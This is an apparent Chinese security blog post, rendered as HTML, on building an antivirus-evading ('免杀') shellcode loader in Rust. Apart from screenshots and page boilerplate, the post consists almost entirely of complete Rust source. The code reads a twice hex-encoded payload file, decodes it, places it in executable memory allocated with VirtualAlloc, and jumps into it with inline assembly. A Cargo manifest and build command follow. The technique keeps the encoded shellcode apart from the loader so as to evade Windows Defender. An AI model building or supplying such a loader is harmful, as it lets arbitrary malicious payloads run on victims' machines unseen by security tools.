src="https://cdn.nlark.com/yuque/0/2022/png/602008/1669965411849-1f305322-5f1a-40ee-8a26-3dc6ef2e123f.png#averageHue=%2390908f&clientId=u145b2b54-a9f6-4&from=paste&height=566&id=uc2313fd3&originHeight=849&originWidth=2247&originalType=binary&ratio=1&rotation=0&showTitle=false&size=325268&status=done&style=none&taskId=ue3fa4ab8-150b-4625-a9e7-1c1fd8a19f8&title=&width=1498" srcset="/img/loading.gif" lazyload alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1669965577408-1cb18a4e-0c8c-474f-88f0-fdb56f05ae4c.png#averageHue=%23a8976b&clientId=u145b2b54-a9f6-4&from=paste&height=762&id=u8d387d59&originHeight=1143&originWidth=1447&originalType=binary&ratio=1&rotation=0&showTitle=false&size=323987&status=done&style=none&taskId=ud096abd2-887d-46f4-945e-2fe62d239f5&title=&width=964.6666666666666" srcset="/img/loading.gif" lazyload alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1669965629454-d655d4ee-fac9-4d91-9f55-c210bef9013b.png#averageHue=%23f9f9f8&clientId=u145b2b54-a9f6-4&from=paste&height=577&id=ubbf8fad3&originHeight=865&originWidth=1389&originalType=binary&ratio=1&rotation=0&showTitle=false&size=142378&status=done&style=none&taskId=ue811848f-030b-4ade-aea9-d7d64adf981&title=&width=926" srcset="/img/loading.gif" lazyload alt="image.png"><br><strong>windows defender</strong><br><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1669965799453-92b5ecd4-4d6a-4e44-9749-6392ee89a34b.png#averageHue=%23c2b066&clientId=u145b2b54-a9f6-4&from=paste&height=723&id=u7701e48c&originHeight=1085&originWidth=2063&originalType=binary&ratio=1&rotation=0&showTitle=false&size=266601&status=done&style=none&taskId=u4cfb9c84-94fe-4d63-af02-d9c071caa00&title=&width=1375.3333333333333" srcset="/img/loading.gif" lazyload alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1669965866911-cc06d6ce-49db-4bd0-904f-8262cd95513a.png#averageHue=%23ccaf6a&clientId=u145b2b54-a9f6-4&from=paste&height=693&id=ue16851f7&originHeight=1040&originWidth=2550&originalType=binary&ratio=1&rotation=0&showTitle=false&size=426130&status=done&style=none&taskId=u5b4af2eb-6990-4408-b637-4e427fa0a83&title=&width=1700" srcset="/img/loading.gif" lazyload alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1669966475423-1937d16b-098a-46f0-86fb-05ee2dc5626f.png#averageHue=%23187d13&clientId=u916ed136-0794-4&from=paste&height=426&id=u214302c8&originHeight=639&originWidth=1153&originalType=binary&ratio=1&rotation=0&showTitle=false&size=187131&status=done&style=none&taskId=u14b28ea9-31b6-49c7-b72f-c8625ea1e95&title=&width=768.6666666666666" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-meta">#![feature(pattern)]</span><br><br><span class="hljs-comment">// #![windows_subsystem = &quot;windows&quot;]</span><br><span class="hljs-keyword">use</span> bindings::windows::win32::system_services::VirtualAlloc;<br><span class="hljs-keyword">use</span> std::arch::asm;<br><br><span class="hljs-keyword">pub</span> <span class="hljs-keyword">const</span> PAGE_EXECUTE_READWRITE: <span class="hljs-type">u32</span> = <span class="hljs-number">0x40</span>;<br><span class="hljs-keyword">pub</span> <span class="hljs-keyword">const</span> MEM_COMMIT: <span class="hljs-type">u32</span> = <span class="hljs-number">0x1000</span>;<br><span class="hljs-keyword">pub</span> <span class="hljs-keyword">const</span> MEM_RESERVE: <span class="hljs-type">u32</span> = <span class="hljs-number">0x2000</span>;<br><br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>()&#123;<br>	<span class="hljs-comment">//经过hex加密</span><br>	<span class="hljs-keyword">let</span> <span class="hljs-variable">contents2</span> = <span class="hljs-keyword">match</span> std::fs::<span class="hljs-title function_ invoke__">read</span>(<span class="hljs-string">&quot;calc64.raw&quot;</span>) &#123;<br>		<span class="hljs-title function_ invoke__">Ok</span>(res) =&gt; res,<br>		<span class="hljs-title function_ invoke__">Err</span>(e) =&gt; &#123;<br>			<span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;[-] Reading Shellcode error: &#123;&#125;&quot;</span>,e);<br>			<span class="hljs-keyword">return</span>;<br>		&#125;<br>	&#125;;<br>	<span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;加密后: &#123;:?&#125;&quot;</span>,contents2);<br><br><br>	<span class="hljs-comment">//ascii 转换</span><br>	<span class="hljs-keyword">let</span> <span class="hljs-variable">s</span> = <span class="hljs-keyword">match</span>  std::<span class="hljs-type">str</span>::<span class="hljs-title function_ invoke__">from_utf8</span>(&amp;contents2)&#123;<br>		<span class="hljs-title function_ invoke__">Ok</span>(res) =&gt; res,<br>		<span class="hljs-title function_ invoke__">Err</span>(e) =&gt; &#123;<br>			<span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;[-] Reading Shellcode error: &#123;&#125;&quot;</span>,e);<br>			<span class="hljs-keyword">return</span>;<br>		&#125;<br>	&#125;;<br>	<span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;ascii转换后contents2:&#123;:?&#125;&quot;</span>,s);<br><br>	<span class="hljs-comment">//hex 解密</span><br>	<span class="hljs-keyword">let</span> <span class="hljs-variable">decode_s</span> = <span class="hljs-keyword">match</span> hex::<span class="hljs-title function_ invoke__">decode</span>(s)&#123;<br>		<span class="hljs-title function_ invoke__">Ok</span>(res) =&gt; res,<br>		<span class="hljs-title function_ invoke__">Err</span>(e) =&gt; &#123;<br>			<span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;[-] Reading Shellcode error: &#123;&#125;&quot;</span>,e);<br>			<span class="hljs-keyword">return</span>;<br>		&#125;<br>	&#125;;<br>	<span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;第一轮hex解密：&#123;:?&#125;&quot;</span>,decode_s);<br><br>	<span class="hljs-comment">//将第一轮解密后的数据进行ASCII解密</span><br>	<span class="hljs-keyword">let</span> <span class="hljs-variable">de_s</span> = <span class="hljs-keyword">match</span>  std::<span class="hljs-type">str</span>::<span class="hljs-title function_ invoke__">from_utf8</span>(&amp;decode_s)&#123;<br>		<span class="hljs-title function_ invoke__">Ok</span>(res) =&gt; res,<br>		<span class="hljs-title function_ invoke__">Err</span>(e) =&gt; &#123;<br>			<span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;[-] Reading Shellcode error: &#123;&#125;&quot;</span>,e);<br>			<span class="hljs-keyword">return</span>;<br>		&#125;<br>	&#125;;<br>	<span class="hljs-keyword">let</span> <span class="hljs-variable">de_s</span> = de_s.<span class="hljs-title function_ invoke__">replace</span>(<span class="hljs-string">&quot;\n&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<br>	<span class="hljs-keyword">let</span> <span class="hljs-variable">de_s</span> = de_s.<span class="hljs-title function_ invoke__">replace</span>(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<br><br>	<span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;第二轮ascii转换：&#123;:?&#125;&quot;</span>,de_s);<br>	<span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;:?&#125;&quot;</span>,de_s);<br><br>	<span class="hljs-comment">//第二轮 hex 解密</span><br>	<span class="hljs-keyword">let</span> <span class="hljs-variable">decode2_s</span> = <span class="hljs-keyword">match</span> hex::<span class="hljs-title function_ invoke__">decode</span>(de_s) &#123;<br>		<span class="hljs-title function_ invoke__">Ok</span>(res) =&gt; res,<br>		<span class="hljs-title function_ invoke__">Err</span>(e) =&gt; &#123;<br>			<span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;[-] Reading Shellcode error: &#123;&#125;&quot;</span>,e);<br>			<span class="hljs-keyword">return</span>;<br>		&#125;<br>	&#125;;<br>	<span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;:?&#125;&quot;</span>,decode2_s);<br><br>	<span class="hljs-keyword">let</span> <span class="hljs-variable">flen</span> = decode2_s.<span class="hljs-title function_ invoke__">len</span>();<br>	<span class="hljs-keyword">let</span> <span class="hljs-variable">new_buf</span> = <span class="hljs-keyword">unsafe</span> &#123;<br>		<span class="hljs-title function_ invoke__">VirtualAlloc</span>(<br>			std::ptr::<span class="hljs-title function_ invoke__">null_mut</span>(),<br>			flen,<br>			MEM_COMMIT | MEM_RESERVE,<br>			PAGE_EXECUTE_READWRITE,<br>		)<br>	&#125;;<br>	<span class="hljs-keyword">if</span> new_buf == std::ptr::<span class="hljs-title function_ invoke__">null_mut</span>()&#123;<br>		<span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;[-] Failed to allocate memory&quot;</span>);<br>		<span class="hljs-keyword">return</span>;<br>	&#125;<br>	<span class="hljs-keyword">let</span> <span class="hljs-variable">new_buf_ptr</span>: *<span class="hljs-keyword">mut</span> <span class="hljs-type">u8</span> = new_buf <span class="hljs-keyword">as</span> *<span class="hljs-keyword">mut</span> <span class="hljs-type">u8</span> <span class="hljs-keyword">as</span> _;<br>	<span class="hljs-keyword">unsafe</span> &#123;std::ptr::<span class="hljs-title function_ invoke__">copy_nonoverlapping</span>(decode2_s.<span class="hljs-title function_ invoke__">as_ptr</span>(), new_buf_ptr, flen)&#125;;<br><br>	<span class="hljs-built_in">println!</span>(<br>		<span class="hljs-string">&quot;[*] Starting jmp to shellcode at offset 0x (base virtual address: &#123;:p&#125;)&quot;</span>,<br>		new_buf_ptr<br>	);<br><br>	<span class="hljs-keyword">unsafe</span> &#123;<br>		<span class="hljs-keyword">let</span> <span class="hljs-variable">jmp_target</span> = new_buf_ptr;<br>		<span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;:?&#125;&quot;</span>,jmp_target);<br><br>		asm!(<span class="hljs-string">&quot;jmp &#123;&#125;&quot;</span>,<span class="hljs-title function_ invoke__">in</span>(reg) jmp_target)<br>	&#125;;<br>&#125;<br></code></pre></td></tr></table></figure>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[package]</span><br><span class="hljs-attr">name</span> = <span class="hljs-string">&quot;rs_shellcode&quot;</span><br><span class="hljs-attr">version</span> = <span class="hljs-string">&quot;0.1.0&quot;</span><br><span class="hljs-attr">authors</span> = [<span class="hljs-string">&quot;b1tg &lt;b1tg@users.noreply.github.com&gt;&quot;</span>]<br><span class="hljs-attr">edition</span> = <span class="hljs-string">&quot;2018&quot;</span><br><br><span class="hljs-comment"># See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html</span><br><br><span class="hljs-section">[dependencies]</span><br><span class="hljs-attr">bindings</span> = &#123; package = <span class="hljs-string">&quot;rs_shellcode_bindings&quot;</span>, path = <span class="hljs-string">&quot;bindings&quot;</span> &#125;<br><span class="hljs-attr">clap</span> = <span class="hljs-string">&quot;3.0.0-beta.2&quot;</span><br><span class="hljs-attr">hex</span> = <span class="hljs-string">&quot;0.4.3&quot;</span><br></code></pre></td></tr></table></figure>
+<p><strong>编译</strong></p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">cargo build</span><br></code></pre></td></tr></table></figure>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Java/" class="category-chain-item">Java</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Web%E5%AE%89%E5%85%A8/" class="print-no-link">#Web安全</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Rust 分离免杀</div>
+      <div>http://example.com/2022/08/09/Rust 免杀（分离）/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年8月9日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/01/07/%E7%A6%85%E9%81%93%E6%BC%8F%E6%B4%9E/" title="禅道研发项目管理系统命令注">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">禅道研发项目管理系统命令注</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/08/04/360tianqingRCE%E5%88%86%E6%9E%90/" title="天擎Github投毒分析">
+                        <span class="hidden-mobile">天擎Github投毒分析</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
